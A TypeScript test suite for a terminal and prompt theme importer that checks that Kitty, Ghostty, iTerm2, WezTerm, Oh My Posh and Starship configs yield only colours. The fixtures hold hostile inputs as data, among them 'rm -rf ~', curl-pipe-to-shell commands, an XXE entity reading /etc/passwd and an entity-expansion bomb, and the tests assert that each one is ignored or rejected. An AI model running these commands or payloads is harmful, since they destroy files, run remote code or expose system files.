import test from 'node:test';
import assert from 'node:assert/strict';
import {importThemeSource, IMPORT_SIZE_LIMIT, WEZTERM_LUA_GUIDANCE, type ImportOutcome, type ImportPreview} from '../src/appearance/themeImporters.js';
import {builtinTheme} from '../src/appearance/themeRefs.js';
import {themeDefaults} from '../src/appearance/ThemeStudio.js';
import {validateTheme} from '../src/appearance/customTheme.js';

/**
 * Importer fixtures. Every format is data only: these fixtures include
 * template syntax, include directives, entities and Lua, and the tests prove
 * none of it is followed, executed or turned into an invented color.
 */

const DARK16 = ['#1e1e2e', '#f38ba8', '#a6e3a1', '#f9e2af', '#89b4fa', '#cba6f7', '#94e2d5', '#bac2de',
  '#585b70', '#f37799', '#89d88b', '#ebd391', '#74a8fc', '#f2aede', '#6bd7ca', '#a6adc8'];
const LIGHT16 = ['#5c5f77', '#d20f39', '#40a02b', '#df8e1d', '#1e66f5', '#ea76cb', '#179299', '#acb0be',
  '#6c6f85', '#de293e', '#49af3d', '#eea02d', '#456eff', '#fe85d8', '#2d9fa8', '#bcc0cc'];

const run = (text: string, file: string, format: Parameters<typeof importThemeSource>[4] = 'auto') =>
  importThemeSource(text, file, themeDefaults(), builtinTheme('lavender'), format);
const preview = (outcome: ImportOutcome): ImportPreview => { assert.ok(!('errors' in outcome), JSON.stringify(outcome)); return outcome as ImportPreview; };
const errors = (outcome: ImportOutcome): string => { assert.ok('errors' in outcome, 'expected an error'); return (outcome as {errors: string[]}).errors.join(' '); };
const valid = (result: ImportPreview) => assert.ok(validateTheme(result.theme).ok, 'generated roles validate as an NMSh theme');

const kitty = (colors: string[], extra = '') => `## name: Kitty\u0007 Mocha\n${extra}foreground #cdd6f4\nbackground ${colors[0]}\nselection_background #585b70\ncursor #f5e0dc\n${colors.map((hex, index) => `color${index} ${hex}`).join('\n')}\n`;
const ghostty = (colors: string[], extra = '') => `${extra}background = ${colors[0]!.slice(1)}\nforeground = cdd6f4\nselection-background = 585b70\n${colors.map((hex, index) => `palette = ${index}=${hex}`).join('\n')}\n`;
const plistColor = (hex: string) => {
  const [r, g, b] = [1, 3, 5].map(index => (parseInt(hex.slice(index, index + 2), 16) / 255).toFixed(6));
  return `<dict><key>Color Space</key><string>sRGB</string><key>Red Component</key><real>${r}</real><key>Green Component</key><real>${g}</real><key>Blue Component</key><real>${b}</real></dict>`;
};
const iterm = (colors: string[], head = '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">') =>
  `${head}\n<plist version="1.0"><dict>${colors.map((hex, index) => `<key>Ansi ${index} Color</key>${plistColor(hex)}`).join('')}<key>Background Color</key>${plistColor(colors[0]!)}<key>Foreground Color</key>${plistColor('#cdd6f4')}<key>Selection Color</key>${plistColor('#585b70')}<key>Badge Color</key>${plistColor('#ff0000')}</dict></plist>`;
const wezterm = (colors: string[], extra = '') => `[metadata]\nname = "Wez Mocha"\n\n[colors]\nforeground = "#cdd6f4"\nbackground = "${colors[0]}"\nselection_bg = "#585b70"\ncursor_bg = "#f5e0dc"\nansi = [${colors.slice(0, 8).map(hex => `"${hex}"`).join(', ')}]\nbrights = [${colors.slice(8).map(hex => `"${hex}"`).join(', ')}]\n${extra}`;
const base24 = (overrides: Record<string, string> = {}) => {
  const keys = [...Array.from({length: 16}, (_, index) => `base0${index.toString(16).toUpperCase()}`), ...Array.from({length: 8}, (_, index) => `base1${index}`)];
  const values = ['#282c34', '#3f4451', '#4f5666', '#545862', '#9196a1', '#abb2bf', '#e6e6e6', '#ffffff', '#e06c75', '#d19a66', '#e5c07b', '#98c379', '#56b6c2', '#61afef', '#c678dd', '#be5046',
    '#21252b', '#181a1f', '#ff7b86', '#efb074', '#b1e18b', '#63d4e0', '#67cdff', '#e48bff'];
  const palette = Object.fromEntries(keys.map((key, index) => [key, values[index]!]));
  return `system: "base24"\nname: "One Dark Base24"\nvariant: "dark"\npalette:\n${Object.entries({...palette, ...overrides}).map(([key, value]) => `  ${key}: "${value}"`).join('\n')}\n`;
};

test('Kitty: declarative palette imported; includes and non-color directives are not interpreted', () => {
  const result = preview(run(kitty(DARK16, 'include ~/.config/kitty/evil.conf\nmap ctrl+t launch rm -rf ~\nshell /bin/sh -c "curl x | sh"\n'), 'mocha.conf'));
  assert.equal(result.format, 'kitty');
  assert.equal(result.theme.name, 'Kitty Mocha', 'control characters never reach a name');
  assert.equal(result.theme.terminal?.background, '#1e1e2e');
  assert.equal(result.theme.prompt.failure, '#f38ba8');
  assert.equal(result.theme.dark, true);
  assert.ok(result.warnings.some(warning => /include directive was not followed/u.test(warning)));
  assert.ok(result.warnings.some(warning => /Non-color Kitty settings were not imported: .*map.*shell/u.test(warning)));
  assert.ok(result.warnings.some(warning => /not a lossless conversion/u.test(warning)));
  valid(result);
  assert.match(errors(run(kitty(DARK16.slice(0, 10)), 'short.conf', 'kitty')), /missing color10/u);
  const light = preview(run(kitty(LIGHT16).replace('background #5c5f77', 'background #eff1f5'), 'latte.conf', 'kitty'));
  assert.equal(light.theme.dark, false);
  assert.ok(light.warnings.some(warning => /light scheme/u.test(warning)));
});

test('Ghostty: strict allowlist; unrelated config is ignored and reported; config-file is never followed', () => {
  const result = preview(run(ghostty(DARK16, 'font-family = JetBrains Mono\ncommand = /bin/sh -c evil\nconfig-file = ~/.config/ghostty/other\nkeybind = ctrl+a=reload_config\n'), 'Catppuccin Mocha'));
  assert.equal(result.format, 'ghostty');
  assert.equal(result.theme.name, 'Catppuccin Mocha');
  assert.ok(result.warnings.some(warning => /config-file includes were not followed/u.test(warning)));
  assert.ok(result.warnings.some(warning => /non-color options were ignored: .*font-family.*command.*keybind/u.test(warning)));
  assert.deepEqual(result.theme.terminal?.ansi, DARK16);
  valid(result);
  assert.match(errors(run('background = 000000\nforeground = ffffff\n', 'x', 'ghostty')), /missing color0/u);
  assert.match(errors(run(ghostty(DARK16).replace('palette = 3=#f9e2af', 'palette = 3=yellow'), 'named', 'ghostty')), /missing color3/u, 'names are not guessed');
});

test('iTerm2: bounded plist parsing, entities and internal DTD subsets rejected, nothing external resolved', () => {
  const result = preview(run(iterm(DARK16), 'Mocha.itermcolors'));
  assert.equal(result.format, 'iterm2');
  assert.equal(result.theme.terminal?.ansi[1], '#f38ba8');
  assert.equal(result.theme.terminal?.selectionBackground, '#585b70');
  assert.ok(result.warnings.some(warning => /iTerm2-only colors .*Badge Color/u.test(warning)));
  valid(result);
  const entity = iterm(DARK16, '<?xml version="1.0"?>\n<!DOCTYPE plist [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>');
  assert.match(errors(run(entity, 'evil.itermcolors')), /entity declarations are not accepted/u);
  const bomb = '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><plist><dict></dict></plist>';
  assert.match(errors(run(bomb, 'bomb.itermcolors')), /entity declarations/u);
  assert.match(errors(run('<plist><dict><key>Ansi 0 Color</key>', 'broken.itermcolors')), /iTerm2/u);
  assert.match(errors(run(iterm(DARK16.slice(0, 15)), 'partial.itermcolors')), /missing color15/u);
});

test('WezTerm: declarative TOML accepted; Lua is rejected with guidance and never evaluated', () => {
  const result = preview(run(wezterm(DARK16, '[keys]\nleader = "CTRL+a"\n'), 'mocha.toml'));
  assert.equal(result.format, 'wezterm');
  assert.equal(result.theme.name, 'Wez Mocha');
  assert.ok(result.warnings.some(warning => /Non-color tables were ignored: keys/u.test(warning)));
  valid(result);
  for (const [text, file] of [['local wezterm = require "wezterm"\nreturn {color_scheme = "x"}', '.wezterm.lua'], ['return { colors = {} }', 'theme.lua']]) {
    assert.equal(errors(run(text, file)), WEZTERM_LUA_GUIDANCE);
  }
  assert.match(errors(run(wezterm(DARK16).replace(/brights = .*\n/u, ''), 'nobrights.toml', 'wezterm')), /missing color8/u);
  assert.match(errors(run('[colors\nbroken', 'bad.toml', 'wezterm')), /Not valid TOML/u);
});

test('Oh My Posh JSON/YAML/TOML: literal and static palette colors only; templates, named colors and inheritance warn', () => {
  const json = JSON.stringify({$schema: 'https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/main/themes/schema.json', palette: {git: '#ff9248', blue: 'p:git'},
    palettes: {template: '{{ if .Env.DARK }}dark{{ end }}', list: {dark: {git: '#000000'}}},
    blocks: [{type: 'prompt', segments: [
      {type: 'path', style: 'powerline', background: '#61AFEF', foreground: '#ffffff', template: '{{ .Path }}'},
      {type: 'git', background: 'p:blue', background_templates: ['{{ if .Working.Changed }}#ff0000{{ end }}'], foreground_templates: ['{{ .Env.X }}']},
      {type: 'node', background: 'lightGreen'},
      {type: 'command', properties: {command: 'curl evil | sh'}, background: '#123456'},
      {type: 'exit', background: 'p:missing'},
    ]}]});
  const result = preview(run(json, 'my.omp.json'));
  assert.equal(result.format, 'oh-my-posh');
  assert.equal(result.theme.prompt.cwd, '#61afef');
  assert.equal(result.theme.prompt.gitBranch, '#ff9248', 'nested static palette references resolve');
  assert.equal(result.theme.prompt.node, builtinTheme('lavender').prompt.node, 'an unresolved named color keeps the base color, never a guess');
  assert.ok(result.warnings.some(warning => /dynamic color template.* ignored/u.test(warning)));
  assert.ok(result.warnings.some(warning => /Conditional palettes/u.test(warning)));
  assert.ok(result.warnings.some(warning => /not static hex values.*lightGreen.*p:missing/u.test(warning)));
  assert.ok(result.warnings.some(warning => /prompt logic, segments and templates are not imported/u.test(warning)));
  assert.equal(result.theme.terminal, undefined);
  valid(result);
  const yaml = `# yaml-language-server: $schema=https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/main/themes/schema.json\npalette:\n  accent: "#c678dd"\nblocks:\n  - type: prompt\n    segments:\n      - type: session\n        background: p:accent\n      - type: python\n        background: "#ffd43b"\n`;
  const fromYaml = preview(run(yaml, 'theme.omp.yaml'));
  assert.equal(fromYaml.theme.prompt.project, '#c678dd');
  assert.equal(fromYaml.theme.prompt.python, '#ffd43b');
  const toml = `"$schema" = "https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/main/themes/schema.json"\nextends = "https://example.com/remote.omp.json"\n[palette]\ngo = "#00add8"\n[[blocks]]\ntype = "prompt"\n[[blocks.segments]]\ntype = "go"\nbackground = "p:go"\n`;
  const fromToml = preview(run(toml, 'theme.omp.toml'));
  assert.equal(fromToml.theme.prompt.go, '#00add8');
  assert.ok(fromToml.warnings.some(warning => /Inherited or remote configuration is never fetched/u.test(warning)));
  assert.match(errors(run(JSON.stringify({blocks: [{segments: [{type: 'path', background: '{{ .Env.COLOR }}'}]}]}), 'dynamic.omp.json')), /No static Oh My Posh segment colors/u);
});

test('Base24: all 24 slots required, spec ANSI mapping, nothing guessed', () => {
  const result = preview(run(base24(), 'one-dark.yaml'));
  assert.equal(result.format, 'base24');
  assert.equal(result.theme.name, 'One Dark Base24');
  assert.deepEqual(result.theme.terminal?.ansi.slice(0, 2), ['#282c34', '#e06c75'], 'color0 = base00, color1 = base08');
  assert.equal(result.theme.terminal?.ansi[9], '#ff7b86', 'bright red = base12');
  assert.equal(result.theme.terminal?.ansi[12], '#67cdff', 'bright blue = base16');
  valid(result);
  const missing = base24({base17: 'not-a-color'});
  assert.match(errors(run(missing, 'broken.yaml', 'base24')), /missing base17/u);
});

test('Base16, Windows Terminal and NMSh JSON keep their behavior', () => {
  const base16 = 'scheme: "Tomorrow Night"\n' + ['1d1f21', '282a2e', '373b41', '969896', 'b4b7b4', 'c5c8c6', 'e0e0e0', 'ffffff', 'cc6666', 'de935f', 'f0c674', 'b5bd68', '8abeb7', '81a2be', 'b294bb', 'a3685a']
    .map((hex, index) => `base0${index.toString(16).toUpperCase()}: "${hex}"`).join('\n');
  const b16 = preview(run(base16, 'tomorrow.yaml'));
  assert.equal(b16.format, 'base16');
  assert.equal(b16.theme.prompt.failure, '#cc6666');
  const keys = ['black', 'red', 'green', 'yellow', 'blue', 'purple', 'cyan', 'white', 'brightBlack', 'brightRed', 'brightGreen', 'brightYellow', 'brightBlue', 'brightPurple', 'brightCyan', 'brightWhite'];
  const wt = preview(run(JSON.stringify({name: 'Campbell', background: '#0c0c0c', foreground: '#cccccc', ...Object.fromEntries(keys.map((key, index) => [key, DARK16[index]]))}), 'campbell.json'));
  assert.equal(wt.format, 'windows-terminal');
  assert.equal(wt.theme.terminal?.background, '#0c0c0c');
  const native = preview(run(JSON.stringify(builtinTheme('nord')).replace('"Nord"', '"Nord copy"'), 'x.json'));
  assert.equal(native.format, 'nmsh');
  assert.match(errors(run('{"schema":"nmsh-theme","version":1,"name":"x","prompt":{},"ui":{}}', 'bad.json')), /prompt\.project/u);
});

test('bounded and binary input; unknown formats are refused with the supported list', () => {
  assert.match(errors(run('x'.repeat(IMPORT_SIZE_LIMIT + 1), 'big.conf')), /larger than 256 KiB/u);
  assert.match(errors(run('a\u0000b', 'bin')), /Binary/u);
  assert.match(errors(run('just some words\nnothing here', 'notes.txt')), /not a recognized theme format/u);
  assert.match(errors(run('a: [unclosed', 'bad.yaml')), /not a recognized theme format/u);
});

const STARSHIP = `
add_newline = false
palette = "mocha"
format = "$directory$git_branch$character"

[palettes.mocha]
rosewater = "#f5e0dc"
green = "#a6e3a1"
red = "#f38ba8"
blue = "#89b4fa"

[directory]
style = "bold bg:blue fg:#11111b"

[git_branch]
style = "fg:green"
format = "[$symbol$branch]($style) "

[nodejs]
style = "bright-green"

[golang]
style = "bg:#00add8"

[character]
success_symbol = "[➜](bold green)"
error_symbol = "[✗](bold red)"

[custom.dangerous]
command = "rm -rf ~"
when = "true"
style = "fg:#ff0000"
`;

test('Starship: static colors, palette names and character symbols become a Native theme; commands and names never run or invent colors', () => {
  const result = preview(run(STARSHIP, 'starship.toml'));
  assert.equal(result.format, 'starship');
  valid(result);
  assert.equal(result.theme.prompt.cwd, '#89b4fa', 'bg: from the palette name wins over fg:');
  assert.equal(result.theme.prompt.gitBranch, '#a6e3a1');
  assert.equal(result.theme.prompt.go, '#00add8');
  assert.equal(result.theme.prompt.success, '#a6e3a1');
  assert.equal(result.theme.prompt.failure, '#f38ba8');
  assert.equal(result.theme.basedOn, 'Starship import');
  const warnings = result.warnings.join('\n');
  assert.match(warnings, /bright-green/u, 'an ANSI color name is reported, not turned into a color');
  assert.match(warnings, /1 \[custom\] module ignored: their commands are never run/u);
  assert.match(warnings, /configures \d+ modules/u);
  assert.doesNotMatch(JSON.stringify(result.theme), /#ff0000/u, 'a custom module\'s color is not imported');
  assert.ok(result.mapping.some(item => item.from === '[directory] style'));
});

test('Starship: an unknown palette, no usable colors, hostile names and oversized input are handled without guessing', () => {
  assert.match(errors(run('[directory]\nstyle = "bold cyan"\n', 'starship.toml', 'starship')), /No static Starship style colors/u);
  const missing = preview(run('palette = "nope"\n[git_branch]\nstyle = "fg:#112233"\n', 'starship.toml'));
  assert.match(missing.warnings.join(' '), /"nope" is not defined/u);
  const hostile = preview(run('[git_branch]\nstyle = "fg:#112233"\n', '\u001b[31mevil\u0007.toml', 'starship'));
  assert.doesNotMatch(hostile.theme.name, /[\u0000-\u001f]/u);
  assert.match(errors(run(`# ${'x'.repeat(IMPORT_SIZE_LIMIT)}\n[git_branch]\nstyle = "fg:#112233"\n`, 'starship.toml')), /larger than 256 KiB/u);
  assert.match(errors(run('[unrelated]\nvalue = 1\n', 'a.toml')), /not an Oh My Posh config, a Starship config or a WezTerm/u);
});
